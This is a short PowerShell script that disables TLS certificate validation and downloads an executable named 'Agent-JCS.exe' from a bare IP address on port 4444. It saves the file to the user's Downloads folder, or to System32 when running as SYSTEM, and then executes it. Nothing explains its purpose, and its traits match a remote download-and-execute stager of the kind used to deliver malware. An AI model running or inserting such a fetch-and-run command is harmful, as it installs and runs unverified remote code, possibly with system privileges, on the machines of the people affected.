invoke-command -ScriptBlock {
    # SETTING POWERSHELL TO USE TLS1.2
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    $URL = "https://209.10.81.36:4444/BITS/Downloads/Agent-JCS.exe"
    $AgentEXE="Agent-JCS.exe"
    If ($env:USERNAME -notlike "*SYSTEM"){$Output = "$env:USERPROFILE\Downloads\$AgentEXE"}
    Else {$Output = "C:\Windows\System32\$AgentEXE"}
    if (get-item $output){remove-item $Output -force}
    (New-Object System.Net.WebClient).DownloadFile($URL, $Output)
    &$Output
    }
